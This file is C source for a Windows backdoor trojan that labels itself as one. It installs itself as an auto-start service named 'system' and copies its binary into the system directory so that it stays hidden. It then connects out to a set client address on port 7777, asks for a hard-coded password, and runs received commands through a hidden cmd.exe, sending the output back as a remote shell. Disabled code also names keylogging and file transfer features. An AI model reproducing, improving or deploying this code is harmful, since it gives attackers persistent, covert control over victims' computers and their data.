//service Trojan
/*
#include<stdio.h>
#include<winsock2.h>
#pragma comment(lib, "ws2_32.lib")
*/
#include "Trojan.h"

void WINAPI ServiceMain(DWORD, LPTSTR *);   //服务主函数 
DWORD WINAPI CmdService(LPVOID);  //CMD 
DWORD WINAPI CmdShell(LPVOID);
void WINAPI ServiceCtrlHandler(DWORD Opcode);   //服务控制函数 
BOOL InstallCmdService();  //安装服务函数 
void DelServices();  //删除服务函数 
int door();    //后门函数 
void Usage(void);  //提示信息 
void WINAPI EXEBackMain(LPVOID s);   //CMD函数 
SERVICE_STATUS m_ServiceStatus;
SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
BOOL bRunning = true;

#define PASSSUCCESS "Password success!\n"
#define PASSERROR "Password error!\n"
#define BYEBYE "Byebye!\n"
#define WSAerron WSAGetLastError()
#define erron GetLastError()
#define PORT 7777
#define DEST_IP_ADDR "127.0.0.1"  //客户端的IP地址

int main(int argc, char *argv[])
{
	SERVICE_TABLE_ENTRY DispatchTable[] = 
	{
		{"system", ServiceMain}, //服务程序的入口点 
		{NULL, NULL}
	//SERVICE_TABLE_ENTRY结构必须以NULL结束 
	};
	if(argc == 1) //InstallCmdService();//BackDoor();
	{	
		//InstallCmdService();
		//InstallCmdService();
		BackDoor();
		//system("pause");
	}
	if(argc == 2)
	{
		if(!stricmp(argv[1], "-i"))  //执行安装服务命令 
		{
			InstallCmdService();
		}
		else if(!stricmp(argv[1],"-r"))
		{
			DelServices();
		}
		else if(!stricmp(argv[1], "-s"))
		{
			BackDoor();
		}
		else
		{
			Usage();
		}
		return 0;
	 } 
	 StartServiceCtrlDispatcher(DispatchTable);
	 return 0;
 } 

int door()
{
	SOCKET sock = NULL;
	struct sockaddr_in sai;
	TCHAR UserPass[20] = {0};  //用户设置密码缓冲 
	TCHAR PassBuf[20] = {0};   //接受密码缓冲 
	TCHAR PassBanner[] = "Password:";
	TCHAR Banner[] = "-------------backdoor------------------\n";
	TCHAR Options[] = "Please input the number: 1.CMD 2.KeyLog 3.FileTrans 4.PrtSc\n";
	char Recv[5];//接受字符
	int Op = 0; 
	sai.sin_family = AF_INET;
	sai.sin_addr.s_addr = inet_addr(DEST_IP_ADDR);
	sai.sin_port = htons(PORT);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	while(TRUE)
	{
		WSADATA wsadata;
		BOOL ThreadFlag = FALSE;
		DWORD ThreadID = 0;
		int nRet = 0;
		nRet = WSAStartup(MAKEWORD(2,2), &wsadata);  //初始化
		if(nRet)
		{
			return 0;
		 } 
		sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(sock == INVALID_SOCKET)
		{
			goto Clean;
		}
		nRet = connect(sock,(struct sockaddr*)&sai,sizeof(struct sockaddr));
		Sleep(5000);
		if(nRet != SOCKET_ERROR)
		{
			nRet = send(sock, Banner, sizeof(Banner), 0);
			
			while(TRUE)
			{	
				nRet = send(sock, PassBanner, sizeof(PassBanner), 0);
				nRet = recv(sock,PassBuf,sizeof(PassBuf)-1,0);
				if(strnicmp(PassBuf,"dirdir",strlen("dirdir")) == 0)
				{
					send(sock, PASSSUCCESS, sizeof(PASSSUCCESS), 0);
					BackDoor();
			/*		if(send(sock, Options, sizeof(Options), 0)){
					printf("send successfully");
					}
					memset(Recv,0,1);
					nRet = recv(sock, Recv, 5,0);
					printf("%c",Recv[0]);
					if(nRet > 0)
					{
						Op = atoi(Recv);
						switch(Op)
						{
							case 1:
								CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EXEBackMain, (LPVOID)sock, 0, &ThreadID);
								break;
							case 2:
								KeyLog();
								break;
							case 3:
								printf("123");
								File(sock);
								break;
							case 4:
								break;	
						}				
					}*/
				}
				memset(PassBuf,0,1);
				if(nRet = SOCKET_ERROR)
				{
					goto Clean;
				}
				Sleep(100);
			}
/*			if(ThreadFlag)
			{
				CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EXEBackMain, (LPVOID)sock, 0, &ThreadID);
			}
*/
		}//结束if 
		Sleep(1000); 
	 } 
	 Clean:
	 	if(sock != NULL)
	 		closesocket(sock);
	 	WSACleanup();
	 	return 0;	
}

//服务主函数
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpArgv)
{
	m_ServiceStatus.dwServiceType = SERVICE_WIN32;
	m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	//服务可以接受的请求，这里我们只接受停止服务请求和暂停恢复请求 
	m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
	m_ServiceStatus.dwWin32ExitCode = 0;
	m_ServiceStatus.dwServiceSpecificExitCode = 0;
	m_ServiceStatus.dwCheckPoint = 0;
	m_ServiceStatus.dwWaitHint = 0;
	m_ServiceStatusHandle = RegisterServiceCtrlHandler("system", ServiceCtrlHandler);
	//ServiceCtrlHandler服务控制函数，被用来开始、恢复、暂停、停止服务等控制操作 
	if(m_ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)return;
	//设置服务状态
	m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	m_ServiceStatus.dwCheckPoint = 0;
	m_ServiceStatus.dwWaitHint = 0;
	//必须调用ServiceStatus()来响应服务控制程序每次的请求通知，ServiceStatus结构含有7个成员，他们反应服务的现行状态
	//所有的成员须在结构被传递到SetServiceStatus之前正确设置 
	if(SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus))
		bRunning = true;
		BackDoor();  //启动我们的服务 
		return; 
 } 

//服务控制函数
void WINAPI ServiceCtrlHandler(DWORD Opcode)
{
	switch(Opcode)
	{
		case SERVICE_CONTROL_PAUSE:   //使用pause命令终止服务
			m_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		 	break;
		case SERVICE_CONTROL_CONTINUE:  //使用continue命令继续服务
			m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
			break;
		case SERVICE_CONTROL_STOP:   //使用stop停止服务 
			m_ServiceStatus.dwWin32ExitCode = 0; 
			m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
			m_ServiceStatus.dwCheckPoint = 0;
			m_ServiceStatus.dwWaitHint = 0;
			SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus);
			bRunning = false;
			break;
		case SERVICE_CONTROL_INTERROGATE:
			break;
			
	}
	return;
 } 

//安装服务函数
BOOL InstallCmdService()
{
	char strDir[1024];
	SC_HANDLE schSCManager, schService;
	GetCurrentDirectory(1024, strDir);  //取当前目录 
	GetModuleFileName(NULL, strDir, sizeof(strDir));  //取当前文件路径和文件名 
	char chSysPath[1024];
	GetSystemDirectory(chSysPath,sizeof(chSysPath));  //取系统目录 
	strcat(chSysPath,"\\system.exe");//将system拼接到系统根目录 
	if(CopyFile(strDir,chSysPath,FALSE)) //把服务程序复制到系统根目录，便于隐藏 
		printf("Copy file OK\n");
	strcpy(strDir,chSysPath);
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(schSCManager == NULL)
	{
		printf("open scmanager failed, maybe you do not have the privilege to do this\n");
		return false; 
	 } 
	LPCTSTR lpszBinaryPathName = strDir;
	//将服务信息添加到SCM的数据库，服务名为system，显示服务名为system
	schService = CreateService(schSCManager, "system", 
	"system",  //将服务的信息添加到SCM的数据库中
	SERVICE_ALL_ACCESS,  //访问权限
	SERVICE_WIN32_OWN_PROCESS,  //服务类型
	SERVICE_AUTO_START,   //启动类型
	SERVICE_ERROR_NORMAL,   //错误控制类型
	lpszBinaryPathName,   //服务名
	NULL,
	NULL,
	NULL,
	NULL,
	NULL 
	);
	if(schService)
		printf("Install Service Success!\n");
	else
		return false;
	CloseServiceHandle(schService);
	return true;
 } 

//删除服务程序
void DelServices()
{
	char name[100];
	SC_HANDLE scm;
	SC_HANDLE service;
	SERVICE_STATUS status;
	strcpy(name, "system");
	if((scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)) == NULL)
	{
		printf("OpenSCManager Error");
	}
	service = OpenService(scm, name, SERVICE_ALL_ACCESS | DELETE);
	if(!service)
	{
		printf("OpenService error!");
		return;
	}
	BOOL isSuccess = QueryServiceStatus(service, &status);
	if(!isSuccess)
	{
		printf("QueryServiceStatus error!");
		return;
	}
	if(status.dwCurrentState != SERVICE_STOPPED)
	{
		isSuccess = ControlService(service, SERVICE_CONTROL_STOP, &status);
		if(!isSuccess)
			printf("Stop Service error!");
		Sleep(500);
	}
	isSuccess = DeleteService(service);
	if(!isSuccess)
		printf("Delete Service Fail!");
	else
		printf("Delete Service Success!");
	CloseServiceHandle(service);
	CloseServiceHandle(scm);
 } 

//cmd功能
void WINAPI EXEBackMain(LPVOID s)
{
	SOCKET sock = (SOCKET)s;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hRead = NULL, hWrite = NULL;
	TCHAR CmdSign[] = "\nGood luck!\\>";
	while(TRUE)
	{
		TCHAR MsgError[50] = {0};   //错误消息缓冲 
		TCHAR Cmdline[300] = {0};   //命令行缓冲 
		TCHAR RecvBuf[1024] = {0}; //接受缓冲 
		TCHAR SendBuf[2048] = {0};   //发送缓冲 
		SECURITY_ATTRIBUTES sa;
		DWORD bytesRead = 0;
		int ret = 0;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		//创建匿名管道
		if(!CreatePipe(&hRead, &hWrite, &sa, 0))
		{
			goto Clean;
		 } 
		si.cb = sizeof(STARTUPINFO);
		GetStartupInfo(&si);
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;   //进程CMD的输出写入管道 
		si.wShowWindow = SW_HIDE;
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		GetSystemDirectory(Cmdline, sizeof(Cmdline));   //获取系统根目录 
		strcat(Cmdline, "\\cmd.exe /c");  //拼接CMD 
		//ret = send(sock, CmdSign, sizeof(CmdSign), 0);  //向目标发送提示符 
		if(ret == SOCKET_ERROR)
		{
			goto Clean; 
		 } 
		ret = recv(sock, RecvBuf, sizeof(RecvBuf), 0);  //接受目标数据 若为exit,quit退出 
		//printf("4444\n");
		if(strnicmp(RecvBuf, "exit",4) == 0 || strnicmp(RecvBuf, "quit", 4) == 0)
		{
			send(sock,BYEBYE,sizeof(BYEBYE), 0);
			goto Clean; 
		 } 
		//表示对方已经断开
		if(ret == SOCKET_ERROR) 
		{
			goto Clean; 
		}
		//表示数据接受出错
		if(ret <= 0)
		{
			#ifdef DEBUGMSG
				sprintf(MsgError,"recv() GetlastError reports %d\n", WSAerron);
				send(sock, MsgError, sizeof(MsgError), 0);
			#endif
			continue; 
		 } 
		Sleep(100);
		strncat(Cmdline, RecvBuf, sizeof(RecvBuf));   //拼接一条完整的cmd命令
		//printf("%s\n",Cmdline);
		//创建进程，也就是执行CMD命令
		if(!CreateProcess(NULL, Cmdline, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi))
		{
			continue;
		 } 
		CloseHandle(hWrite);
		while(TRUE)  //循环读取管道中的数据，直到没有数据 
		{
			if(ReadFile(hRead, SendBuf, sizeof(SendBuf), &bytesRead, NULL) == 0)
				break;
			send(sock, SendBuf, bytesRead, 0); //发送出去
			//printf("5555\n");
			memset(SendBuf, 0, sizeof(SendBuf));//缓冲清零
			Sleep(100); 
	    }	
	}
	Clean: //释放句柄
		if(hRead != NULL)
			CloseHandle(hRead);
		if(hWrite != NULL)
			CloseHandle(hWrite);
		//释放socket
		if(sock != NULL)
			closesocket(sock);
		WSACleanup();
		ExitThread(0);
		//return 0 
 } 

void Usage()
{
	fprintf(stderr, "Code by Turkeyteam\n""Usage:%s[-i][-r]-i:install service;-r:remove service.\n");
}














